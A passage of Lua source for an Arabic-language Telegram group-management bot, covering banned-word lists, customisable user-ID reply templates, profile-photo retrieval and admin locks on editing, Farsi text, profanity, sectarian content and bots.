local names = DevAbs:hkeys(abs)
text = "☬︙قٱئمة ٱڵكڵمٱت ٱڵممنوعة ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for i=1, #names do
text = text..'⌯ ❨ '..names[i]..' ❩\n'
end
if #names == 0 then
text = "☬︙لٱ يوجد كڵمٱت ممنوعة "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end
--     Source DevProx     --
if text and text:match("^قائمه المنع العام$") and Abbas_Abs(msg) or text and text:match("^قائمه الفلاتر العام$") and Abbas_Abs(msg) or text and text:match("^قائمه المنع عام$") and Abbas_Abs(msg) then
local abs = (DevProx..'bot:freewords:')
if abs then
local names = DevAbs:hkeys(abs) 
text = '☬︙قٱئمة ٱڵمنع ٱڵعٱم ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for i=1, #names do
text = text..'⌯ ❨ '..names[i]..' ❩\n'
end
if #names == 0 then
text = "☬︙لٱ يوجد كڵمٱت ممنوعة عٱم "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
end
--     Source DevProx     --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تغيير الايدي$") and Abbas_Abs(msg) or text and text:match("^تغير الايدي$") and Abbas_Abs(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
☬︙𝐔𝐒𝐄𝐑 ↫ #username 
☬︙𝐈𝐃 ↫ #id
☬︙𝐒𝐓𝐀𝐒𝐓 ↫ #stast
☬︙𝐀𝐔𝐓𝐎 ↫ #cont 
☬︙𝐌𝐀𝐒𝐆 ↫ #msgs
☬︙𝐆𝐀𝐌𝐄 ↫ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]]}
local Text_Rand = List[math.random(#List)]
DevAbs:set("DevProx:ABS_PROX:id:text:"..bot_id..msg.chat_id_,Text_Rand)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تغيير كڵيشة ٱلٱيدي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
--     Source DevProx     --
if text and text:match("^تعيين الايدي$") and Abbas_Abs(msg) or text and text:match("^تعين الايدي$") and Abbas_Abs(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙رجٱئٱ ٱتبع ٱڵتعڵيمٱت ڵڵتعيين \n☬︙ڵطبع كڵيشة ٱلٱيدي ٱرسڵ كڵيشة تحتوي عڵى ٱڵنصوص ٱڵتي بٱڵڵغة ٱلٱنجڵيزية ٱدنٱه \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n #username  ⇝ ڵطبع ٱڵمعرف •\n #id  ⇝ ڵطبع ٱلٱيدي • \n #photos  ⇝ ڵطبع عدد ٱڵصور • \n #stast  ⇝ ڵطبع ٱڵـُرتب • \n #msgs  ⇝ ڵطبع عدد ٱڵرسٱئڵ • \n #formsg  ⇝ ڵطبع ٱڵتفٱعڵ • \n #game  ⇝ ڵطبع عدد ٱڵنقٱط • \n #cont  ⇝ ڵطبع عدد ٱڵجهٱت • \n #sticker  ⇝ ڵطبع عدد ٱڵمڵصقٱت • \n #edit  ⇝ ڵطبع عدد ٱڵتعديلٱت •\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevAbs:set("DevProx:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'ABS_PROX')
return "ABS_PROX"
end
if text and is_owner(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("DevProx:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم ٱڵغاء حفظ كليشة ٱلٱيدي', 1, 'md')
DevAbs:del("DevProx:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
return false
end
DevAbs:del("DevProx:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵجډيډة', 1, 'md')
DevAbs:set("DevProx:ABS_PROX:id:text:"..bot_id..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and Abbas_Abs(msg) or text and text:match("^مسح الايدي$") and Abbas_Abs(msg) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف كڵيشة ٱلٱيدي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del("DevProx:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
end
end
--     Source DevProx     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and Abbas_Abs(msg) then
function ABS_PROX(extra,result,success)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
local function getpro(extra, result, success) 
local ABS_PROX = DevAbs:get(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local edit_msg = DevAbs:get(DevProx..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(DevAbs:get(DevProx.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local user_nkt = tonumber(DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevAbs:get(DevProx..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
if result.photos_[0] then
if not DevAbs:get('DevProx:id:mute'..msg.chat_id_) then 
if not DevAbs:get('DevProx:id:photo'..msg.chat_id_) then 
if not DevAbs:get("DevProx:ABS_PROX:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"\n☬︙معرفک ↫ ❨ "..username.." ❩\n☬︙ٱيـډيک ↫ ❨ "..msg.sender_user_id_.." ❩\n☬︙رتـبتک ↫ ❨ "..id_rank(msg).." ❩\n☬︙صورک ↫ ❨ "..result.total_count_.." ❩\n☬︙رسٱئڵک ↫ ❨ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ❩\n☬︙تفٱعڵک ↫ ❨ "..formsgg(msguser).." ❩\n☬︙نقاطک ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n",msg.id_,msg.id_.."")
else 
local new_id = DevAbs:get("DevProx:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs + Dev_Abss / ABS_PROX or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if not DevAbs:get("DevProx:ABS_PROX:id:text:"..bot_id..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "\n☬︙معرفک ↫ ❨ "..username.." ❩\n☬︙ٱيـډيک ↫ ❨ "..msg.sender_user_id_.." ❩\n☬︙رتـبتک ↫ ❨ "..id_rank(msg).." ❩\n☬︙صورک ↫ ❨ "..result.total_count_.." ❩\n☬︙رسٱئڵک ↫ ❨ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ❩\n☬︙تفٱعڵک ↫ ❨ "..formsgg(msguser).." ❩\n☬︙جـهٱتک ↫ ❨ "..cont.." ❩\n☬︙نقاطک ↫ ❨ "..user_nkt.." ❩\n☬︙مڵصقٱتک ↫ ❨ "..sticker.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n", 1, 'html')
else
local new_id = DevAbs:get("DevProx:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs + Dev_Abss / ABS_PROX or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
Dev_Abs(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عذرٱ ٱلٱيدي مۘعطڵ ', 1, 'md')
end
else
if not DevAbs:get('DevProx:id:mute'..msg.chat_id_) then
if not DevAbs:get('DevProx:id:photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ ٱستطيع عرض صورتک\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙معرفک ↫ ❨ "..username.." ❩\n☬︙ٱيـډيک ↫ ❨ "..msg.sender_user_id_.." ❩\n☬︙رتـبتک ↫ ❨ "..id_rank(msg).." ❩\n☬︙صورک ↫ ❨ "..result.total_count_.." ❩\n☬︙رسٱئڵک ↫ ❨ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ❩\n☬︙تفٱعڵک ↫ ❨ "..formsgg(msguser).." ❩\n☬︙جـهٱتک ↫ ❨ "..cont.." ❩\n☬︙نقاطک ↫ ❨ "..user_nkt.." ❩\n☬︙مڵصقٱتک ↫ ❨ "..sticker.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "\n☬︙معرفک ↫ ❨ "..username.." ❩\n☬︙ٱيـډيک ↫ ❨ "..msg.sender_user_id_.." ❩\n☬︙رتـبتک ↫ ❨ "..id_rank(msg).." ❩\n☬︙صورک ↫ ❨ "..result.total_count_.." ❩\n☬︙رسٱئڵک ↫ ❨ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ❩\n☬︙تفٱعڵک ↫ ❨ "..formsgg(msguser).." ❩\n☬︙نقاطک ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n", 1, 'html')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عذرٱ ٱلٱيدي مۘعطڵ', 1, 'md')
end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1
}, getpro, nil)
end
getUser(msg.sender_user_id_, ABS_PROX)
end
end 
--     Source DevProx     --
if text == "صورتي" and not DevAbs:get(DevProx.."lock:get:photo"..msg.chat_id_) and Abbas_Abs(msg) then 
local function getpro(extra, result, success)
if result.photos_[0] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"☬︙فـي حسٱبك ( "..result.total_count_.." ) من ٱڵـصور‌‏ ", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك صورة شخصية ", 1, 'md') end 
end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end 
if text and text:match("^صورتي (%d+)$") and Abbas_Abs(msg) then
local ABSendPhoto = {string.match(text, "^(صورتي) (%d+)$")}
local function gproen(extra, result, success)
if not is_admin(msg.sender_user_id_, msg.chat_id_) and DevAbs:get(DevProx.."lock:get:photo"..msg.chat_id_)  then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '️☬︙عذرٱ جڵب ٱڵـصور ٱڵشخصية مۘعطڵ', 1, 'md')
else
if ABSendPhoto[2] == '1' then
if result.photos_[0] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 1 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك صورة شخصية ", 1, 'md') end
elseif ABSendPhoto[2] == '2' then
if result.photos_[1] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 2 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من صورتين ", 1, 'md') end
elseif ABSendPhoto[2] == '3' then
if result.photos_[2] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 3 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 3 ) صور ", 1, 'md') end
elseif ABSendPhoto[2] == '4' then
if result.photos_[3] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 4 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 4 ) صور ", 1, 'md') end
elseif ABSendPhoto[2] == '5' then
if result.photos_[4] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 5 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 5 ) صور ", 1, 'md') end
elseif ABSendPhoto[2] == '6' then
if result.photos_[5] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 6 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 6 ) صور ", 1, 'md') end
elseif ABSendPhoto[2] == '7' then
if result.photos_[6] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 7 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 7 ) صور ", 1, 'md') end
elseif ABSendPhoto[2] == '8' then
if result.photos_[7] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 8 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 8 ) صور ", 1, 'md') end
elseif ABSendPhoto[2] == '9' then
if result.photos_[8] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 9 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 9 ) صور ", 1, 'md') end
elseif ABSendPhoto[2] == '10' then
if result.photos_[9] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 10 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 10 ) صور ", 1, 'md') end
elseif ABSendPhoto[2] == '11' then
if result.photos_[10] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[10].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 11 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 11 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '12' then
if result.photos_[11] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[11].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 12 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 12 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '13' then
if result.photos_[12] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[12].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 13 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 13 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '14' then
if result.photos_[13] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[13].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 14 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 14 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '15' then
if result.photos_[14] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[14].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 15 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 15 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '16' then
if result.photos_[15] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[15].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 16 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 16 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '17' then
if result.photos_[16] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[16].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 17 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 17 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '18' then
if result.photos_[17] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[17].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 18 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 18 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '19' then
if result.photos_[18] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[18].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 19 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 19 ) صورة ", 1, 'md') end
elseif ABSendPhoto[2] == '20' then
if result.photos_[19] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[19].sizes_[1].photo_.persistent_id_,"☬︙صورتك رقم ( 20 )", msg.id_, msg.id_, "md") else Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱنت لٱ تمتڵك ٱكثر من ( 20 ) صورة ", 1, 'md') end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ يمكنني ٱرسٱڵ ٱكثر من ( 20 ) صورة ", 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = ABSendPhoto[2] }, gproen, nil)
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل (.*)$") and Abbas_Abs(msg) then
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockptf[2] == "التعديل" then
if not DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵتعديڵ بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'editmsg'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵتعديڵ بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if lockptf[2] == "التعديل الميديا" or lockptf[2] == "تعديل الميديا" then
if not DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ تعديڵ ٱڵميديٱ\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'editmsg'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تعديڵ ٱڵميديٱ بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if lockptf[2] == "الفارسيه" then
if not DevAbs:get(DevProx..'farsi'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵفٱرسية بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'farsi'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵفٱرسية بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if lockptf[2] == "الفشار" then
if DevAbs:get(DevProx..'fshar'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـفشٱر بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'fshar'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـفشٱر بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if lockptf[2] == "الطائفيه" then
if DevAbs:get(DevProx..'taf'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵطٱئفيه بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'taf'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵطٱئفيه بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if lockptf[2] == "الكفر" then
if DevAbs:get(DevProx..'kaf'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـكفر بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'kaf'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـكفر بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if lockptf[2] == "الفارسيه بالطرد" then
if not DevAbs:get(DevProx..'farsiban'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵفٱرسية بٱڵطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'farsiban'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵفٱرسية بٱڵطرد بٱڵفعـل مۘقفلة ', 1, 'md')
end
end
if lockptf[2] == "الشارحه" then
if not DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵشٱرحة بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:cmds'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵشٱرحة بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة ', 1, 'md')
end
end
if lockptf[2] == "البوتات" then
if not DevAbs:get(DevProx..'bot:bots:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵبوتٱت بنجٱح \n ✓'
